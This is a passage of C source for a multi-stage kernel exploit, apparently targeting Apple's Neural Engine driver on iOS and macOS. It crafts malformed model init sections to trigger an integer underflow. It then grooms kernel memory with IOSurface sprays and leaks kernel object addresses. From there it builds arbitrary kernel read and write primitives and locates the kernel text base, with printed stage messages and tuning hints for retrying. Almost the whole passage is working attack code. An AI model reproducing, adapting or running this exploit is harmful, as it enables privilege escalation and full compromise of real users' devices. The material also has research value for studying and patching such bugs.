                u8 * tmp = (u8*)memmem(p->shmems[i]->shm_addr,p->shmems[i]->shm_len,&scratch,size);
                if(tmp) {
                        printf("[+] Found scratched ShmemID 0x%x with size 0x%x\n",
                               p->shmems[i]->shm_id,p->shmems[i]->shm_len);
                        *offset = (u32)(tmp - (u8 *)p->shmems[i]->shm_addr);
                        return p->shmems[i];
                }
        }
        return NULL;
}

void _hwx_patch_model(struct mach_header_64 *mh,size_t mh_size,u8 ** initInfo)
{
        if((mh->magic != 0xfeedface) && (mh->magic != 0xbeefface)) {
                printf("[-] Not a mach-O file \n");
                assert(false);
        }

        // TODO : use +[_ANEDeviceInfo aneSubType]
        /* iPhone 11 pro */
        /* mh->cpusubtype = 3; */

        /* iPad pro 2nd generation */
        /* mh->cpusubtype = 1; */

        struct load_command *lc = NULL;
        FOR_EACH_COMMAND {

                if (lc->cmd == LC_SEGMENT_64) {
                        struct segment_command_64 *seg = (struct segment_command_64*)lc;
                        dbg("Found LC_SEGMENT_64 %s \n",seg->segname);
                        struct section_64 * sct_start = (struct section_64*)(seg + 1);
                        struct section_64 * sct_end = &sct_start[seg->nsects];

                        for (struct section_64* sect=sct_start; (sect < sct_end); ++sect) {
#if 0
                                printf("%s :section %s Flags 0x%x size = 0x%llx \n",
                                    sect->segname,sect->sectname,sect->flags,sect->size);
#endif
                                if(!strcmp(sect->segname,"__TEXT") && !strcmp(sect->sectname,"__const")) {
                                        sect->flags = 0x2C;
                                        *initInfo = (u8 *)mh + sect->offset;;
                                }

                                if(!strcmp(sect->segname,"__FVMLIB") && !strcmp(sect->sectname,"__fvmlib_init0")) {
                                        dbg("Found __fvmlib_init0 section \n");
                                        sect->flags = 0;
                                }

                                if(!strcmp(sect->segname,"__INIT") && !strcmp(sect->sectname,"__text")) {
                                        sect->flags = 0x2a;
                                }

                        }

                } else if (lc->cmd == LC_THREAD) {
                        struct compute_thread_command *thread = (struct compute_thread_command *)lc;
                        switch (thread->flavor) {
                        case THREAD_PROCEDURE_OPERATION: {
                                *(uint64_t*)((char*)thread + 0x830 + 0x10) = rand();  /* 0x10 is the load cmd size */
                                break;
                        }
                        default:
                                break;
                        }
                }

        }

}

/* Prepare the weight buffer content */
static void setup_ANECMutableProcedureInfo(u8 *address,size_t address_size,
                                           size_t total_size,size_t chunk_size,
                                           u64 chunk_offset)
{
        bzero(address,address_size);
        uint32_t weight_size = 0x1;

        struct ANECMutableProcedureInfo * pinfo = (struct ANECMutableProcedureInfo *)address;
        pinfo->hdr.weight_buffer_size = weight_size;
        struct weightInfo *mw = NULL;

        for(int i=0; i < weight_size; i++) {
                pinfo->wb_offsets[i] = 0x200;
                struct opsInfo *ops = (struct opsInfo *)((u8*)pinfo + pinfo->wb_offsets[i]);
                ops->op_count = (u32)total_size/0x10;

                for(int j = 0; j < ops->op_count; j++  ) {
                        ops->op_offsets[j] = 0x1000;
                        mw = (struct weightInfo *)((u8 *)pinfo + ops->op_offsets[j]);
                        mw->wi_index = 0;
                        mw->wi_offset = chunk_offset;
                        mw->wi_size = chunk_size;
                }
        }
}

#define __set8(ptr,val)                         \
        *ptr++ = val;

#define __set16(ptr,val)                           \
        *(u16 *)ptr = val;                         \
        ptr+=2;

#define __set32(ptr,val)                          \
        *(u32 *)ptr = val;                        \
        ptr+=4;

#define __set64(ptr,val)                          \
        *(u64 *)ptr = val;                        \
        ptr+=8;

#define DeCxt_GetFileInfo(ptr,index32,offset64,size64)                  \
        *(u32 *) ptr =  index32;                                        \
        *(u64 *) (ptr + 4)  =  offset64;                                \
        *(u64 *) (ptr + 12) =  size64;                                  \
        ptr+=20;

#define DeCxt_GetWeightInfo(ptr,val8,val16_ptr)         \
        *ptr++ = val8;                                  \
        for(int i=0 ; i < 5;i++) {                      \
                *(u16 *)(ptr) = val16_ptr[i];           \
                ptr+=2;                                 \
        }                                               \

#define DeCxt_ParseTransformInfo(ptr,val8, val16_ptr)   \
        *ptr++ = val8[0];                               \
        *ptr++ = val8[1];                               \
        *ptr++ = val8[2];                               \
                                                        \
        *(u16 *)ptr = val16_ptr[0]; ptr+=2;             \
        *(u16 *)ptr = val16_ptr[1]; ptr+=2;             \
        *(u16 *)ptr = val16_ptr[2]; ptr+=2;             \


#define DeCxt_ParseOcgRasterizationInfo(ptr,val16_ptr)  \
        for(int i=0 ; i < 4;i++) {                      \
                *(u16 *)(ptr) = val16_ptr[i];           \
                ptr+=2;                                 \
        }                                               \

/* Serialize init_section then patch model.hwx's init_section later before loading it */
static void serialize_initinfo_section(u8 *init_info,serializer_info_t *info)
{
        dbg("[+] Serializing init_section header  \n");
        u8 * ptr = init_info;
        u8 * info_hdr = (u8 *)init_info;

        /* DeCxt::ParseHeader */
        __set32(info_hdr,2);
        __set32(info_hdr,0x80);
        __set32(info_hdr,2);
        __set32(info_hdr,2);

        ptr = info_hdr;
        __set64(ptr,0x2000);
        *(u64 *)(init_info + 0x2000 ) = 0x2000;;
        *(u64 *)(init_info + 0x2000 + 8) = 0x3000;

        /* DeCxt::ProcessInitInfo */

        /* -> DeCxt::ParseScaleBiasWeightFileInfo */
        u8 *ptr2 = init_info + 0x3000;
        __set8(ptr2,1);                             /* Enalbe fileInfo1 */
        __set8(ptr2,1);                             /* Enalbe fileInfo2 */
        __set8(ptr2,1);                             /* Enalbe fileInfo3 */

        /* --> DeCxt::GetFileInfo */
        DeCxt_GetFileInfo(ptr2,info->chunk_index,0,info->global_chunk_size);
        DeCxt_GetFileInfo(ptr2,0,0,1);
        DeCxt_GetFileInfo(ptr2,0,0,1);

        /* --> DeCxt::GetWeightInfo */
        u16 val16[5] = {1,2,3,4,5};
        DeCxt_GetWeightInfo(ptr2,41,val16);

        __set16(ptr2,1);                            /* used for buffer allocation, putting it to zero will skip the loop */
        u8 *ptr3 = ptr2;                            /* ZinIrDeserializer::Read() */

        /* --> DeCxt::ParseTransform */
        /* ***** first loop **** */
        __set8(ptr3,1);                             /* case 1 */

        __set64(ptr3,info->read_count/2);           /* how many u64 we want to leak ? */
        __set64(ptr3,info->read_offset);            /* the starting offset to read from*/

        /* ***** second loop **** */
        __set16(ptr3,1);

        u8 val8[3] = {1,1};
        u16 val16_2[3] = {1,0,0};
        DeCxt_ParseTransformInfo(ptr3,val8,val16_2);

        __set16(ptr3,0);                            /* The chunk index */


        __set16(ptr3,1);                            /* Back to Transform list */
        __set16(ptr3,1);                            /* Back to Transform list */

        /* DeCxt::RasterizeScaleBiasData */
        __set64(ptr3,info->underflow);              /* 2nd arg : The value that will underflow the calculaion */

        __set16(ptr3,1);                            /* 3rd arg : u16 value */

        /* ParseOcgRasterizationInfo */
        u16 ocgInfo[4] = {0,0,0,info->ocg.vals[3]};
        DeCxt_ParseOcgRasterizationInfo(ptr3,ocgInfo);

}

void kwrite64(uint64_t address,uint64_t value)
{
#if TARGET_OS_OSX
        *(u64 *) (krw.shm_uaddr + 0x358) = address;
#else
        *(u64 *) (krw.shm_uaddr + 0x360) = address;
#endif
        set_indexed_timestamp(p->iosurface,krw.surface_id,0,value);
}

uint32_t kread32(uint64_t address)
{
        *(u64 *) (krw.shm_uaddr + 0xc0 ) = address - 0x14;
        uint32_t out = 0;
        iosurface_get_use_count(p->iosurface,krw.surface_id,&out);
        return out;

}

uint64_t kread64(uint64_t address)
{
        uint32_t out = kread32(address);
        uint32_t out2 = kread32(address + 4);
        uint64_t value = ((uint64_t)out2 << 32) | out;

        return value;
}
void khexdump(u64 kaddr,u64 size)
{
        u8 * data = (u8 *)calloc(size,1);
        for(int i=0; i < size;i+=8) {
                u64 kdata = kread64(kaddr + i);
                *(u64 *) (data + i) = kdata;
        }

        hexdump(data,size);
        free(data);

}

static void iosurface_spray_kernel_map(u32 surface_id,u32 key,u32 size,u32 count)
{
        init_iosurface_prop_data();

        u32 ppsz = 0x10;
        u8 * pp = (u8 *)calloc(ppsz,1);
        memset(pp,0xAA,ppsz);

        uint32_t offkey = build_iosurface_payload(size/8,pp,ppsz,key);
        u32 lkey = key;
        for(int i=0; i < count;i++) {
                iosurface_set_value(p->iosurface,surface_id);
                *(uint32_t *)(prop_data + offkey * 4) = lkey++;
        }
        free(pp);
}

static void get_surface_base(uint32_t surface_id,u8 **address, size_t *size)
{
        IOSurfaceRef s = IOSurfaceLookup(surface_id);
        assert(s);
        *address = (u8*)IOSurfaceGetBaseAddress(s);
        *size = (size_t)IOSurfaceGetAllocSize(s);
        CFRelease(s);
}

void init_structs(void)
{

        p = (struct exploit *)calloc(1,sizeof(struct exploit));
        assert(p);

        p->initInfo_sz = 0x4000;
        vm_address_t addr = 0;
        kern_return_t kr = vm_allocate(mach_task_self(),&addr,p->initInfo_sz,1);
        p->initInfo = (u8*)addr;
        assert(kr == KERN_SUCCESS);

         /* Prepare WeightSurface, the kernel mapping of this will land at KHEAP_DATA_BUFFERS */
        p->weightsBufferSize = 0x80000;
        IOSurfaceFastCreateArgs args = {0};
        args.IOSurfaceAddress = (vm_address_t)malloc(p->weightsBufferSize);
        args.IOSurfaceAllocSize =  (uint32_t)p->weightsBufferSize;

        p->iosurface = create_surface_fast_path(IO_OBJECT_NULL, &p->weightsSurface, &args);
        store_surface_id(p->weightsSurface);

        p->weightsBuffer = (u8*)IOSurfaceGetBaseAddress(IOSurfaceLookup((IOSurfaceID)p->weightsSurface));
        args.IOSurfaceAddress = 0;
        args.IOSurfaceAllocSize =  0x400000;
        create_surface_fast_path(p->iosurface, &p->InOutSurface, &args);
        store_surface_id(p->InOutSurface);

        /* Prepare the serializer object */
        sinfo = (serializer_info_t *)calloc(1,sizeof(serializer_info_t));
        assert(sinfo);

        p->groom_surface_count = 0x20;
        p->groom_pageable_maps_count = MAX_SHMEMS;

#if TARGET_OS_OSX
        p->groom_kernel_map_count = 0x10;
#else
        p->groom_kernel_map_count = 0x30;
#endif
}

void groom_kernel_map(void)
{
        u64 program_handle =0;
        u32 loaded_progs_count = MAX_PROGRAMS;

        /*   size = 0xc000                                                                                      */
        /*   <============>                                                                                     */
        /*  +--------------+--------------+--------------+-----------+-----------------------------------       */
        /*  | OSArray ptrs | OSArray ptrs | OSArray ptrs | fresh VA  |            ..........                    */
        /*  +--------------+--------------+--------------+-----------+-----------------------------------       */
        /*  <------------------------------------------ kernel_map ---------------------------------------      */
        /*  */


        if(p->kernel_map_groom_done == false) {
                printf("[+] Grooming kernel_map ... ");
                for(int i=0; i < p->groom_kernel_map_count; i++)
                        iosurface_spray_kernel_map(p->weightsSurface,0x44444401 + i,0xc000,1); /*  */

                p->kernel_map_groom_done = true;
        }

        /*  Groom kernel_map such that OSArray backing store objects fall between H11ANEProgramBufferParamsStruct(s)*/
        /*             size=0x54000                   size=0x54000                                                      */
        /*           <=============>                 <=============>                                                    */
        /* ---------+---------------+---------------+---------------+---------------+-----+-------------------------    */
        /*   ...    | ProgramBuffer | ProgramBuffer |    OSArray    | ProgramBuffer | ... | ProgramBuffer  ...          */
        /* ---------+---------------+---------------+---------------+---------------+-----+-------------------------    */
        /* ^------------------------------------------ kernel_map -----------------------------------------------       */
        /*  */

        u32 keys[loaded_progs_count], keys_cnt = 0;
        for(int i=0;i < loaded_progs_count; i++) {
                /*
                 * This is a crucial step to improve the success rate of stage 2:
                 * Make sure that each page in IOSurface_zone contains at least one IOSurface
                 * object that's owned by us, so later when we leak an IOSurface_zone_page from that zone
                 * we can retrieve an IOSurface object through IOSurfaceID identification.
                 */
                u32 ssid = 0;
                IOSurfaceFastCreateArgs args = {0};
                args.IOSurfaceAddress =  (vm_address_t)malloc(0x4000);
                args.IOSurfaceAllocSize =  0x4000;
                // for(int j=0; j < 2;j++) {
                for(int j=0; j < 2;j++) {
                        create_surface_fast_path(p->iosurface, &ssid, &args);
                        store_surface_id(ssid);
                }

                program_handle = hwx_load_model();
                hwx_unload_model(program_handle);

                if((i % 2) == 0) {
                        keys[keys_cnt] = 0x10101001 +  (keys_cnt <<28);
                        iosurface_spray_kernel_map(p->weightsSurface,keys[keys_cnt++],0x54000,1);
                }
                printf(". ");

        }
        printf("OK\n");

        /* MUTK & PROG IOSurface mappings will be adjacents to our DeviceShmem mappings                                                         */
        /*        size=0x4000    size=0x4000  size=0x10000                                                          */
        /*       <============> <==========> <=============>                                                        */
        /* -----+--------------+------------+---------------+------------+--------------+-------                    */
        /*  ... | DeviceShmemN |  MUTK(1)   |    PROG(1)    |   MUTK(2)  |    PROG(2)   |  ...                      */
        /* -----+--------------+------------+---------------+------------+--------------+-------                    */
        /*                                                                                                          */


        /*  Free OSArray objects to create holes in kernel_map                                                          */
        /*             size=0x54000                   size=0x54000                                                      */
        /*           <=============>                 <=============>                                                    */
        /* ---------+---------------+---------------+---------------+---------------+-----+-------------------------    */
        /*   ...    | ProgramBuffer | ProgramBuffer |     FREED     | ProgramBuffer | ... | ProgramBuffer  ...          */
        /* ---------+---------------+---------------+---------------+---------------+-----+-------------------------    */
        /* ^------------------------------------------ kernel_map -----------------------------------------------       */
        /*                                                                                                              */

        for(int i=0; i < keys_cnt; i++) {
                dbg("Removing key 0x%x \n",keys[i]);
                iosurface_remove_property(p->iosurface,p->weightsSurface,keys[i]);
        }

}

 /* Leak H11ANESharedMemorySurfaceParamsStruct from kernel_map */
bool get_mutk_object(void)
{
        u64 program_handle =0;
        u8* _ptrbuf = 0;
        size_t sz = 0;

        /* Allocate MutableWeight with size of 0x54000 that will likely overlap with one of the freed OSArrays   */
        /*             size=0x54000         size=0x54000                                                                */
        /*           <===============> <=========================>                                                      */
        /* ---------+-----------------+----------------------------+---------------+-----+-------------------------     */
        /*   ...    | ProgramBuffer   |    MutableWeight[]  | ProgramBuffer | ... | ProgramBuffer  ...           */
        /* ---------+-----------------+----------------------------+---------------+-----+-------------------------     */
        /* ^------------------------------------------ kernel_map -----------------------------------------------       */
        /*                                                                                                              */

        setup_ANECMutableProcedureInfo((u8*)p->weightsBuffer,p->weightsBufferSize,0x54000,0x4000,p->weightsBufferSize-0x4000);

        /* 0x14000 = 'MUTK' + 'PROG' IOSurface allocation sizes                                                           */
        /* Copy out the leaked H11ANESharedMemorySurfaceParamsStruct to one of the shared memory buffers that we've       */
        /* created via IOGPU                                                                                              */
        sinfo->underflow =  0 - (0x20 * 0x14000);

#if 0

        /*
         * 0x000a7e1 = (&programbuffer->MUTK_Surface[0] - weightBuffer)/0x10 = (0x54000 + 0x53E10)/0x10
         * 0x54000 is the rounded up size of H11ANEProgramBufferParamsStruct
         * 0x53E10 is the offset of H11ANESharedMemorySurfaceParamsStruct in H11ANEProgramBufferParamsStruct object
         * 0x10 is the size of MutableWeight entry
         */

        /* Snippet from a reverse-engineer'ed MutableOperationInfo (size = 0x53E70) */
        struct MutableWeight {
                uint8_t * wbuf_chunk;
                size_t  wbuf_chunk_size;

        };

        /* Snippet from a reverse-engineer'ed H11ANESharedMemorySurfaceParamsStruct (size = 0x53E70) */
        struct __attribute__((aligned(8))) _H11ANEProgramBufferParamsStruct
        {
                ...
                H11ANESharedMemorySurfaceParamsStruct *MUTK_Surface[2];      /* + 0x53E10 */
                ...
        };

        /* reverse-engineer'ed H11ANESharedMemorySurfaceParamsStruct (size = 0x48) */
        struct H11ANESharedMemorySurfaceParamsStruct
        {
                size_t size;
                IOSurface *p_IOSurface;
                uint64_t dartMapBase;
                IOMemoryDescriptor *surface_memDesc;
                IOMemoryMap *surface_memMap;
                uintptr_t surface_vAddress;
                IODMACommand *dmaCommand;
                uint8_t usage[4];
                uint32_t ref_count;
                uint32_t programId;
                uint32_t processId;
        };
#endif

        /*
         * Because we're sure that one of the ProgramBuffer objects is adjacent to our MutableOperationInfo array,
         * and both objects are 0x54000 bytes size, it is safe to consider this value as constant
         */
        sinfo->chunk_index =  0x000a7e1;

        sinfo->read_count = 0x48;                      /* Read sizeof(H11ANESharedMemorySurfaceParamsStruct) = 0x48 */
        sinfo->global_chunk_size = ~0;
        sinfo->ocg.vals[3] = sinfo->read_count;         /* Write sizeof(H11ANESharedMemorySurfaceParamsStruct) back to our shmem */
        serialize_initinfo_section(p->initInfo,sinfo);

        program_handle = hwx_patch_and_load_model();
        do_send_ane_request(program_handle);

        u32 offset = 0, scratched_surface = 0;

        /*
         * The leaked 0x48 bytes should contain 'MUTK' integer value in it
         * If not found, it means either the spray has failed or something other than H11ANESharedMemorySurfaceParamsStruct
         * has been leaked.
         */
        struct shmem * shm = lookup_scratched_shmem('MUTK',4,&offset);
        if(shm == NULL) {
                printf("[-] Something went wrong here, if you experience this failure a lot, this means the device is not idle "
                        "and we couldn't shape the memory as expected. It's preferable to reboot the device and try again \n");
                exit(-1);
                return false;
        }

        _ptrbuf  = shm->shm_addr;
        sz = shm->shm_len;

        /* Needed for the last exploit stage */
        krw.surface_id = scratched_surface;
        krw.shm_uaddr = _ptrbuf;
        krw.shm_size = sz;
        _ptrbuf = _ptrbuf + offset - 0x38;

        memcpy(&aneMemSurface,_ptrbuf,0x48);

        hexdump(_ptrbuf,0x48);
        printf("[+] Leaked mutable kernel section (MUTK) buffer 0x%llx \n",aneMemSurface.surface_address);
        printf("[+] Leaked IOSurface object 0x%llx \n",aneMemSurface.p_IOSurface);

        /*
         * Needed to perform the arbitrary kernel write later
         * We picked a random memory that's (hopefully) one of our shared memory buffer
         * We'll figure out later its backing user space address
         */
        krw.shm_kaddr =  aneMemSurface.surface_address - (80 * 0x4000);

        printf("[+] Kernel location of our input buffer 0x%llx \n",krw.shm_kaddr);

        if(aneMemSurface.p_IOSurface > aneMemSurface.surface_address) {
                printf("*********************************************************************************\n");
                printf("FATAL: The exploit has anticipated a failure that would likely crash the device at the last stage because of the target IOSurface is invalid \n"
                       "    It's preferable to stop here and run the exploit again \n");
                printf("*********************************************************************************\n");
                sleep(1);
                /* exit(-1); */
                return false;
        }

        bzero(shm->shm_addr,shm->shm_len);
        hwx_unload_model(program_handle);
        return true;
}

bool get_target_surface(u64 *kaddr_target)
{
        u64 program_handle =0;
        u64 target = 0;
        u8* _ptrbuf = 0;
        u32 offset = 0;

        IOSurface_zone_page  = trunc_page(aneMemSurface.p_IOSurface);
#if 0
        printf("Offset 0x%llx \n",aneMemSurface.p_IOSurface - IOSurface_zone_page);
#endif
        assert(!((aneMemSurface.p_IOSurface - IOSurface_zone_page) % IOSURFACE_OBJ_SIZE));

#if TARGET_OS_OSX
        u64 shift_off = 0x34000;
#else
        u64 shift_off = 0x14000;
#endif

        /*
         * We are trying to learn the upcoming weight surface kernel mapping in IOKitPageableMaps
         * For each program loaded, two IOSurface objects are created: 'PROG' and 'MUTK' (0x14000 bytes)
         * We need to deduce an accurate location in order to preform the arbitrary read later
         * Fortunately, it's possible to precisely anticipate the location based on the shift_off
         * if a kernel panic or failure occurred at this stage please see DEBUG_EXPLOIT_STAGE_2_KERN_PANIC
         */
        u64 weightSurface_kloc = aneMemSurface.surface_address + shift_off;
        dbg("[+] Deduced weightSurface (from IOKitPageableSpace submaps) location 0x%llx \n",weightSurface_kloc);

        IOSurfaceFastCreateArgs args = {0};

        args.IOSurfaceAllocSize =  0x20000;
        args.IOSurfaceAddress = 0;
        create_surface_fast_path(p->iosurface, &p->weightsSurface, &args);
        store_surface_id(p->weightsSurface);

        get_surface_base(p->weightsSurface,&p->weightsBuffer,(size_t *)&p->weightsBufferSize);
        dbg("[+] Created new (weight) IOSurface id=0x%x base=0x%llx size=0x%lx\n",
               p->weightsSurface,(u64)p->weightsBuffer,p->weightsBufferSize);

        target = (0 - (weightSurface_kloc - IOSurface_zone_page));
        /* target = (0x4141414141414141); //(weightSurface_kloc - IOSurface_zone_page)); */

#if DEBUG_EXPLOIT_STAGE_2_KERN_PANIC
        /*
         * In case of several failures occurred at this stage :
         * 1. Enable DEBUG_EXPLOIT_STAGE_2_KERN_PANIC
         * 2. Get the faulted address from the kernel panic log : would be something like 0x414141414XXXX242
         * 3. in lldb -> p/x 0x4141414142424242 - 0x414141414XXXX242 = new_value
         * 4. Update shift_off = (old)shift_off - new_value
         */

        target = (0 - (weightSurface_kloc - 0x4141414142424242));
        dbg("[*] Target to read from 0x%llx \n",target);
#endif

        /* Use the integer overflow to underflow the weight surface buffer to point into IOSurface_zone_page location */
        setup_ANECMutableProcedureInfo((u8*)p->weightsBuffer,p->weightsBufferSize,
                                       0x10,
                                       (0 - target ) + 0x8000,target);

        bzero(sinfo,sizeof(*sinfo));

        /* Like weightSurface_kloc, anticipate the next 'mutk' surface buffer location  */
        u64 mutk_addr = weightSurface_kloc - 0x4000;

        assert(krw.shm_kaddr);

        sinfo->underflow =  (0 - 0x003d0000);

#if !TARGET_OS_OSX
        sinfo->underflow =  (krw.shm_kaddr - mutk_addr);
#endif

        sinfo->chunk_index = 0;
        sinfo->read_count = 0x4000;               /* DeCxt::ParseTransform() case [1] 1st ReadUint64() */
        sinfo->global_chunk_size = ~0;
        sinfo->ocg.vals[3] = sinfo->read_count;
        serialize_initinfo_section(p->initInfo,sinfo);

        program_handle = hwx_patch_and_load_model();
        do_send_ane_request(program_handle);

        offset = 0;
#if TARGET_OS_OSX
        struct shmem * shm = lookup_scratched_shmem(0xfffffe,3,&offset);
#else
        struct shmem * shm = lookup_scratched_shmem(0xffffff,3,&offset);
#endif
        if(shm == NULL) {
                printf("FAIL\n");
                printf("[-] Could not find scratched Shmem .. run the exploit again\n");
                return false;
        }
        _ptrbuf  = shm->shm_addr;
        _ptrbuf = _ptrbuf + offset - 21;

        /* IOSurfaceRoot location  */
        IOSurfaceRoot = *(u64 *) (_ptrbuf + 0x28);

        /* hexdump(_ptrbuf,0x4000); */

        for(u32 i=0; i < 0x4000;i+=IOSURFACE_OBJ_SIZE) {
                u8 *ptr  = _ptrbuf + i;
                dbg("Reading from 0x%llx \n",IOSurface_zone_page + i);
                //hexdump(ptr,0x20);
                //printf("--- \n");

                /* The IOSurface we want must have one reference only so the leaked IOSurfaceClient is certainly ours  */
                u32 refcount = *(u32 *)(ptr + 8);
                u32 ss = *(u32 *)(ptr + 0xc);                 /* IOSurfaceID */

                for(int j=0; j < g_IOSurfaceIds_count; j++) {
                        if(ss == g_IOSurfaceIds[j] && refcount == 1) {
                                matched.surface_id = ss;
                                matched.loc  = ptr;
#if TARGET_OS_OSX
                                matched.IOSurfaceClient_loc = *(u64 *)(ptr + 0x338);
#else
                                matched.IOSurfaceClient_loc = *(u64 *)(ptr + 0x340);
#endif
                                matched.IOSurface_loc = IOSurface_zone_page + ptr - _ptrbuf;

                                printf("[+] Found a matching surface-id=0x%04x IOSurface=0x%llx ! \n",
                                       matched.surface_id,
                                       matched.IOSurface_loc);
                        }
                }
                /* if(matched.surface_id) break; */
        }

        /* assert(matched.surface_id && "Unable to find a suitable IOSurface"); */

        /* Looks like our IOSurface_zone grooming didn't work out as expected, just run the exploit again */
        if(!matched.surface_id) {
                printf("[-] Stage 3 Failed : Unable to find an IOSurface controlled by us\n");
                return false;

        }
        printf("[+] IOSurfaceClient location 0x%llx \n",matched.IOSurfaceClient_loc);
        printf("[+] IOSurface location 0x%llx \n",matched.IOSurface_loc);
        printf("[+] IOSurfaceRoot 0x%llx \n",IOSurfaceRoot);


        usleep(1000);
        bzero(shm->shm_addr,shm->shm_len);

        /* We want to overwrite IOSurface location with an arbitrary kernel address */
        target = matched.IOSurfaceClient_loc + 0x40;
        *kaddr_target  = matched.IOSurfaceClient_loc + 0x40;
        hwx_unload_model(program_handle);
        return true;
}

bool get_kernel_rw(void)
{

        u8 * chunk = p->weightsBuffer + p->weightsBufferSize - 0x4000;
        bzero(p->weightsBuffer,p->weightsBufferSize);

        setup_ANECMutableProcedureInfo((u8*)p->weightsBuffer,p->weightsBufferSize,0x10,0x4000,p->weightsBufferSize-0x4000);

        memset(sinfo,0,sizeof(serializer_info_t));

        /* Overwrite IOSurfaceClient->pIOSurface with IOGPU shared memory (krw.shm_kaddr) */
        /* At this step, we don't know which shmem is backing the kernel mapping whose address is krw.shm_kaddr  */
        /* Let's find out ...  */

        /* We don't need to worry about determining the offset at which a bogus IOSurface object starts because it will always be at offset 0, because all IOGPU shmem sizes are page size. */
        for(u32 i=0; i < p->shmems_count;i++) {
                /* memset(p->shmems[i]->shm_addr,0x44,0x4000); */

                for(int j=0; j < p->shmems[i]->shm_len; j+=8) {
                        *(u64 *) (p->shmems[i]->shm_addr + j ) = 0x4141414100000000 |j; /* useful to detect faults */
                }

                /* Bypass IOSurface->IOSurfaceRoot check */
                *(u64 *) (p->shmems[i]->shm_addr + 0x28) = IOSurfaceRoot;

                /* Fake IOSurface->SharedRO with arbitrary kernel address to preform the leak via IOSurface::get_use_count() */
                *(u64 *) (p->shmems[i]->shm_addr + 0xc0) = (u64)krw.shm_kaddr  + 0x2000 - 0x14;

                /* SharedRO location : we want to figure out which user address matches our 'krw.shm_kaddr' */
                *(u64 *) (p->shmems[i]->shm_addr + 0x2000) = 0x41410000 |p->shmems[i]->shm_id;

        }

#if 0
        *(u64 *) chunk  = 0xdeadbeef11223344;               /* For debugging purpose  */
#else
        *(u64 *) chunk  = krw.shm_kaddr;                    /* Fake IOSurface Object */
#endif


#if TARGET_OS_OSX
        u64 mutk_addr = (aneMemSurface.surface_address + 0x40000);
#else
        u64 mutk_addr = (aneMemSurface.surface_address + 0x10000);
#endif  /* TARGET_OS_OSX */

        u64 target_write = (matched.IOSurfaceClient_loc + 0x40);

// #define DEBUG_EXPLOIT_STAGE_4_KERN_PANIC 1
#if DEBUG_EXPLOIT_STAGE_4_KERN_PANIC
        /*
         * If you encouter several kernel panics at this stage it means that the offset is not
         * quite accurate for this device, enable DEBUG_EXPLOIT_STAGE_4_KERN_PANIC and follow the steps
         * described in stage 3
         */
        target_write = 0x4141414142424242;

#endif

        /* assert(target_write < mutk_addr && "Cannot write into this address :("); */

        /*
         * Due to the nature of the OOB write, we cannot write to a memory region whose address
         * is upper to the MUTK mapping address. That's because of the enhanced kernel_map randomization.
         * Just play with MAX_SHMEMS and it will likely work in the second try ...
         */
        if(target_write > mutk_addr) {
                printf("[-] Failed: we cannot write into this address=0x%llx from mutk_addr=0x%llx\n",
                       target_write,mutk_addr);
                printf("****** INCREASE MAX_SHMEMS BY 0x1000 THEN RUN THE EXPLOIT AGAIN *********** \n");
                return false;
        }
        /* SUCCESS! we can ovewrite the target location now */
        sinfo->underflow =  (target_write) - mutk_addr;
        sinfo->chunk_index =  0;

        sinfo->read_count = 0x8;            /* DeCxt::ParseTransform() case [1] 1st ReadUint64() */
        sinfo->global_chunk_size = ~0;
        sinfo->ocg.vals[3] = sinfo->read_count;
        serialize_initinfo_section(p->initInfo,sinfo);

        u64 program_handle = hwx_patch_and_load_model();

        do_send_ane_request(program_handle);

        u32 target_shmid = 0;
#if 1
        iosurface_get_use_count(p->iosurface,matched.surface_id,&target_shmid);
#else
        /* For debugging purpose */
        for(int i=0; i < g_IOSurfaceIds_count;i++) {
                iosurface_get_use_count(p->iosurface,g_IOSurfaceIds[i],&target_shmid);
                if((target_shmid & 0x41410000) == 0x41410000)
                        break;
                target_shmid = 0;
        }
#endif

        /* assert(target_shmid); */
        if(target_shmid == 0) {
                printf("[-] Unable to retrieve the backing shmid id \n");
                return false;
        }

        target_shmid &= ~0x41410000;
        printf("[+] Got shmem id 0x%x for 0x%llx \n",target_shmid,krw.shm_kaddr);
        /* sleep(1); */

        printf("[+] Stage 5: Get stable arbitrary kernel read/write .... ");
        for(int i =0; i < p->shmems_count;i++) {
                if(target_shmid != p->shmems[i]->shm_id) continue;

                krw.shm_uaddr = (u8*)p->shmems[i]->shm_addr;
                krw.shm_size  = p->shmems[i]->shm_len;
                break;
        }

        krw.surface_id = matched.surface_id;

        u64 val = xpacd(kread64(IOSurfaceRoot));


        printf("OK \n");
        printf("[+] IOSurfaceRoot vtable 0x%llx \n",val);

        u64 temp1 = kread64(val);
        printf("[+] kread64([0x%llx]) = 0x%llx\n",val,temp1);

        u64 temp = kread64(krw.shm_kaddr + 0x3000);
        printf("[+] kread64([0x%llx]) = 0x%llx\n",krw.shm_kaddr + 0x3000,temp);
        printf("[+] kwrite64(0x%llx,0x%lx) \n",krw.shm_kaddr + 0x3000,0xdeadbeef12345678);
        kwrite64(krw.shm_kaddr + 0x3000,0xdeadbeef12345678);
        temp = kread64(krw.shm_kaddr + 0x3000);
        printf("[+] kread64([0x%llx]) = 0x%llx\n",krw.shm_kaddr + 0x3000,temp);
        /* sleep(1); */
        u64 kaddr = trunc_page(val);
        u32 magic = 0, filetype = 0;
#if 1

        do {
                kaddr -= 0x4000;
                magic = kread32(kaddr);
                filetype = kread32(kaddr + 0xc);
        }while((magic != 0xfeedfacf) || (filetype != 2));

        printf("[+] Kernel text base 0x%llx\n",kaddr);
        khexdump(kaddr,0x70);
#endif

#if 0
        kwrite64(0x1111111111111111,0x2222222222222222);
#endif
        return true;

}

void cleanup(void)
{
        /* Restore the old state as if nothing happened */
        kwrite64(matched.IOSurfaceClient_loc + 0x40,matched.IOSurface_loc );
        printf("[+] Cleanup done\n");



}
void show_device_spec(void)
{
        struct utsname u = {0};
        uname(&u);
        printf("\tsystem name = %s\n", u.sysname);
        printf("\tnode name   = %s\n", u.nodename);
        printf("\trelease     = %s\n", u.release);
        printf("\tversion     = %s\n", u.version);
        printf("\tmachine     = %s\n", u.machine);
}

int exploit(void)
{
#if !TARGET_OS_OSX
        hwx_init_frameworks();
#endif

        init_structs();

        hwx_patch_model();

        printf("[+] Stage 1: Grooming kernel memory ... \n");
        /* p->groom_pageable_maps_count *= 2; */
        /* p->groom_surface_count *=2; */

        groom_IOSurface_zone();
        groom_pageable_maps();
        groom_kernel_map();

        if(!get_mutk_object())
                exit(-1);

        printf("[+] Stage 3: Dumping a memory page from IOSurface_zone  \n");
        u64 kaddr = 0;
        if(!get_target_surface(&kaddr))
                return -1;

        usleep(1000);
        printf("[+] Stage 4: Performing the arbitrary write primitive ... \n");
